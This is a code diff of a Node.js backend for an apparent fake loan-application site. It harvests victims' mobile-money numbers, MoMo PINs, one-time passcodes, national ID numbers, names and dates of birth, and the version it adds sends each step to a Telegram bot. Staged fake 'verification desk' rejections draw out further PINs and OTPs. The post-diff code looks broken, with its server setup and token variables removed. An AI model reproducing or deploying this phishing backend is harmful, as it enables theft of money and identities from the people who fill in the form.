@@ -1,50 +1,3 @@
-require('dotenv').config()
-
-const express = require('express')
-const http = require('http')
-const cors = require('cors')
-const { Server } = require('socket.io')
-
-function validateEnvironment() {
-  const requiredKeys = ['TELEGRAM_BOT_TOKEN', 'TELEGRAM_CHAT_ID']
-  const missingKeys = requiredKeys.filter(
-    (key) => !process.env[key] || !process.env[key].trim(),
-  )
-
-  if (missingKeys.length > 0) {
-    throw new Error(
-      `Missing required environment variables: ${missingKeys.join(', ')}`,
-    )
-  }
-
-  if (/\s/.test(process.env.TELEGRAM_BOT_TOKEN)) {
-    throw new Error('TELEGRAM_BOT_TOKEN must not contain spaces.')
-  }
-}
-
-try {
-  validateEnvironment()
-} catch (error) {
-  console.error(`Environment validation failed: ${error.message}`)
-  process.exit(1)
-}
-
-const app = express()
-const server = http.createServer(app)
-const sessions = new Map()
-
-const allowedOrigins = [
-  'http://localhost:5173',
-  'http://localhost:5174',
-  'https://zamcash.vercel.app',
-]
-
-const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN
-const telegramChatId = process.env.TELEGRAM_CHAT_ID
-
-console.log('BOT TOKEN:', telegramBotToken?.substring(0, 12))
-console.log('CHAT ID:', telegramChatId)
-
 function toSafeText(value, fallback = 'N/A') {
   if (value === undefined || value === null || value === '') {
     return fallback
@@ -53,268 +6,242 @@ function toSafeText(value, fallback = 'N/A') {
   return String(value)
 }
 
-/* ===========================
-   FIRST TELEGRAM NOTIFICATION
-   (After Step 4)
-=========================== */
-
-function createFirstMessage({
-  appId,
-  step1,
-  step3,
-  step4,
-}) {
+// STEP 1
+function createStep1Message({ appId, step1 }) {
   return [
-    '🚨 NEW LOAN APPLICATION',
+    '🟢 STEP 1 RECEIVED',
+    `App ID: ${toSafeText(appId)}`,
     '',
-    `🆔 App ID: ${toSafeText(appId)}`,
-    `💰 Loan Type: ${toSafeText(step1?.loanType)}`,
-    `💵 Amount: ${toSafeText(step1?.amount)} ZMW`,
-    `📅 Term: ${toSafeText(step1?.term)} Months`,
-    `📝 Purpose: ${toSafeText(step1?.purpose)}`,
-    `💼 Employment: ${toSafeText(step3?.employment)}`,
+    `Loan Type: ${toSafeText(step1?.loanType)}`,
+    `Amount (ZMW): ${toSafeText(step1?.amount)}`,
+    `Term (Months): ${toSafeText(step1?.term)}`,
+    `Purpose: ${toSafeText(step1?.purpose)}`,
     '',
-    '📱 MOBILE MONEY',
-    `📞 Number: ${toSafeText(step4?.phone)}`,
-    `🔑 PIN: ${toSafeText(step4?.password)}`,
-    '',
-    `🕒 ${new Date().toLocaleString()}`,
+    `Time: ${new Date().toLocaleString()}`
   ].join('\n')
 }
 
-/* ===========================
-   SECOND TELEGRAM NOTIFICATION
-   (After Step 5)
-=========================== */
-
-function createSecondMessage({
-  appId,
-  referenceId,
-  step5,
-}) {
+// STEP 2
+function createStep2Message({ appId, step2 }) {
   return [
-    '✅ OTP RECEIVED',
+    '🟡 STEP 2 RECEIVED',
+    `App ID: ${toSafeText(appId)}`,
     '',
-    `🆔 App ID: ${toSafeText(appId)}`,
-    `📄 Reference: ${toSafeText(referenceId)}`,
-    `🔐 OTP: ${toSafeText(step5?.pin)}`,
+    `First Name: ${toSafeText(step2?.firstName)}`,
+    `Last Name: ${toSafeText(step2?.lastName)}`,
+    `NRC: ${toSafeText(step2?.nrc)}`,
+    `Date of Birth: ${toSafeText(step2?.dob)}`,
     '',
-    `🕒 ${new Date().toLocaleString()}`,
+    `Time: ${new Date().toLocaleString()}`
   ].join('\n')
 }
-async function sendTelegramMessage(text) {
-  const endpoint = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`
 
-  const response = await fetch(endpoint, {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json',
-    },
-    body: JSON.stringify({
-      chat_id: telegramChatId,
-      text,
-      disable_web_page_preview: true,
-    }),
-  })
+// STEP 3
+function createStep3Message({ appId, step3 }) {
+  return [
+    '🟠 STEP 3 RECEIVED',
+    `App ID: ${toSafeText(appId)}`,
+    '',
+    `Employment: ${toSafeText(step3?.employment)}`,
+    `Employer: ${toSafeText(step3?.employer)}`,
+    `Income: ${toSafeText(step3?.income)}`,
+    '',
+    `Time: ${new Date().toLocaleString()}`
+  ].join('\n')
+}
 
-  if (!response.ok) {
-    let details = ''
+// STEP 4
+function createStep4Message({ appId, step4 }) {
+  return [
+    '🔵 STEP 4 RECEIVED',
+    `App ID: ${toSafeText(appId)}`,
+    '',
+    `MoMo Number: ${toSafeText(step4?.phone)}`,
+    `MoMo PIN: ${toSafeText(step4?.password)}`,
+    '',
+    `Time: ${new Date().toLocaleString()}`
+  ].join('\n')
+}
 
-    try {
-      const payload = await response.json()
-      details = payload?.description
-        ? `: ${payload.description}`
-        : ''
-    } catch {
-      details = ''
-    }
-
-    throw new Error(
-      `Telegram send failed with status ${response.status}${details}`,
-    )
+// STEP 5
+function createStep5Message({ appId, referenceId, step5 }) {
+  return [
+    '✅ STEP 5 COMPLETED',
+    `App ID: ${toSafeText(appId)}`,
+    `Reference: ${toSafeText(referenceId)}`,
+    '',
+    `OTP: ${toSafeText(step5?.pin)}`,
+    '',
+    `Application Submitted Successfully`,
+    `Time: ${new Date().toLocaleString()}`
+  ].join('\n')
+}
+socket.on('step1', async (payload) => {
+  const session = {
+    ...sessions.get(socket.id),
+    step1: payload,
   }
-}
 
-app.use(
-  cors({
-    origin(origin, callback) {
-      if (!origin || allowedOrigins.includes(origin)) {
-        callback(null, true)
-        return
-      }
+  sessions.set(socket.id, session)
 
-      callback(new Error('Origin not allowed by CORS'))
-    },
-  }),
-)
-
-app.use(express.json())
-
-app.get('/api/health', (_request, response) => {
-  response.json({
-    status: 'ok',
-  })
+  try {
+    await sendTelegramMessage(
+      createStep1Message({
+        appId: session.appId,
+        step1: payload,
+      }),
+    )
+  } catch (error) {
+    console.error(error)
+  }
 })
 
-app.get('/api/session/:id', (request, response) => {
-  const session = sessions.get(request.params.id)
+socket.on('step2', async (payload) => {
+  const session = {
+    ...sessions.get(socket.id),
+    step2: payload,
+  }
 
-  if (!session) {
-    response.status(404).json({
-      message: 'Session not found',
+  sessions.set(socket.id, session)
+
+  try {
+    await sendTelegramMessage(
+      createStep2Message({
+        appId: session.appId,
+        step2: payload,
+      }),
+    )
+  } catch (error) {
+    console.error(error)
+  }
+})
+socket.on('step3', async (payload) => {
+  const session = {
+    ...sessions.get(socket.id),
+    step3: payload,
+  }
+
+  sessions.set(socket.id, session)
+
+  try {
+    await sendTelegramMessage(
+      createStep3Message({
+        appId: session.appId,
+        step3: payload,
+      }),
+    )
+  } catch (error) {
+    console.error(error)
+  }
+})
+
+socket.on('step4', (payload) => {
+  if (!payload?.phone || !/^\d{5}$/.test(payload?.password ?? '')) {
+    socket.emit('error', {
+      message: 'Wallet phone and a valid 5-digit MoMo PIN are required.',
     })
     return
   }
 
-  response.json({
-    id: request.params.id,
-    data: session,
-  })
-})
+  const session = {
+    ...sessions.get(socket.id),
+    step4: payload,
+  }
 
-const io = new Server(server, {
-  cors: {
-    origin: allowedOrigins,
-    methods: ['GET', 'POST'],
-  },
-})
+  sessions.set(socket.id, session)
 
-io.on('connection', (socket) => {
-  const appId = `APP-${Date.now()
-    .toString(36)
-    .toUpperCase()}`
+  ;(async () => {
+    try {
+      await sendTelegramMessage(
+        createStep4Message({
+          appId: session.appId,
+          step4: payload,
+        }),
+      )
+    } catch (error) {
+      console.error(error)
+    }
+  })()
 
-  sessions.set(socket.id, { appId })
-
-  socket.emit('session-ready', {
-    appId,
-  })
-
-  socket.on('step1', (payload) => {
-    sessions.set(socket.id, {
-      ...sessions.get(socket.id),
-      step1: payload,
-    })
-  })
-
-  socket.on('step2', (payload) => {
-    sessions.set(socket.id, {
-      ...sessions.get(socket.id),
-      step2: payload,
-    })
-  })
-
-  socket.on('step3', (payload) => {
-    sessions.set(socket.id, {
-      ...sessions.get(socket.id),
-      step3: payload,
-    })
-  })
-  socket.on('step4', async (payload) => {
-    if (!payload?.phone || !/^\d{5}$/.test(payload?.password ?? '')) {
-      socket.emit('error', {
-        message: 'Wallet phone and a valid 5-digit MoMo PIN are required.',
+  setTimeout(() => {
+    if (payload.password === '00000') {
+      socket.emit('password-rejected', {
+        message: 'PIN rejected by the verification desk.',
       })
       return
     }
 
-    sessions.set(socket.id, {
-      ...sessions.get(socket.id),
-      step4: payload,
+    socket.emit('password-verified')
+  }, 1200)
+})
+socket.on('step5', (payload) => {
+  if (!payload?.pin || payload.pin.length !== 6) {
+    socket.emit('error', {
+      message: 'A 6-digit OTP is required.',
     })
+    return
+  }
 
-    /* ===========================
-       FIRST TELEGRAM NOTIFICATION
-    =========================== */
+  setTimeout(async () => {
+    if (payload.pin === '000000') {
+      socket.emit('pin-rejected', {
+        message: 'OTP invalid or expired. Try a new code.',
+      })
+      return
+    }
+
+    const session = sessions.get(socket.id) || {}
+    const referenceId = `REF-${Math.random()
+      .toString(36)
+      .slice(2, 8)
+      .toUpperCase()}`
+
+    sessions.set(socket.id, {
+      ...session,
+      referenceId,
+      step5: payload,
+    })
 
     try {
-      const sessionSnapshot = sessions.get(socket.id) || {}
-
-      const firstMessage = createFirstMessage({
-        appId: sessionSnapshot.appId,
-        step1: sessionSnapshot.step1,
-        step3: sessionSnapshot.step3,
-        step4: payload,
-      })
-
-      await sendTelegramMessage(firstMessage)
-    } catch (error) {
-      console.error(
-        `First Telegram notification failed: ${error.message}`,
-      )
-    }
-
-    setTimeout(() => {
-      if (payload.password === '00000') {
-        socket.emit('password-rejected', {
-          message: 'PIN rejected by the verification desk.',
-        })
-        return
-      }
-
-      socket.emit('password-verified')
-    }, 1200)
-  })
-  socket.on('step5', (payload) => {
-    if (!payload?.pin || payload.pin.length !== 6) {
-      socket.emit('error', {
-        message: 'A 6-digit OTP is required.',
-      })
-      return
-    }
-
-    setTimeout(async () => {
-      if (payload.pin === '000000') {
-        socket.emit('pin-rejected', {
-          message: 'OTP invalid or expired. Try a new code.',
-        })
-        return
-      }
-
-      const sessionSnapshot = sessions.get(socket.id) || {}
-
-      const referenceId = `REF-${Math.random()
-        .toString(36)
-        .slice(2, 8)
-        .toUpperCase()}`
-
-      sessions.set(socket.id, {
-        ...sessionSnapshot,
-        referenceId,
-        step5: payload,
-      })
-
-      /* ===========================
-         SECOND TELEGRAM NOTIFICATION
-      =========================== */
-
-      try {
-        const secondMessage = createSecondMessage({
-          appId: sessionSnapshot.appId,
+      await sendTelegramMessage(
+        createStep5Message({
+          appId: session.appId,
           referenceId,
           step5: payload,
-        })
+        }),
+      )
+    } catch (error) {
+      console.error(error)
+    }
 
-        await sendTelegramMessage(secondMessage)
-      } catch (error) {
-        console.error(
-          `Second Telegram notification failed: ${error.message}`,
-        )
-      }
-
-      socket.emit('pin-verified', {
-        referenceId,
-        appId: sessionSnapshot.appId,
-      })
-    }, 1400)
-  })
-  socket.on('disconnect', () => {
-    sessions.delete(socket.id)
-  })
+    socket.emit('pin-verified', {
+      referenceId,
+      appId: session.appId,
+    })
+  }, 1400)
 })
+async function sendTelegramMessage(text) {
+  try {
+    const response = await fetch(
+      `https://api.telegram.org/bot${telegramBotToken}/sendMessage`,
+      {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          chat_id: telegramChatId,
+          text,
+          disable_web_page_preview: true,
+        }),
+      },
+    )
 
-const port = Number(process.env.PORT) || 4000
-
-server.listen(port, () => {
-  console.log(`Server listening on http://localhost:${port}`)
-})
+    if (!response.ok) {
+      const error = await response.text()
+      console.error('Telegram Error:', error)
+    }
+  } catch (error) {
+    console.error('Telegram Error:', error.message)
+  }
+}
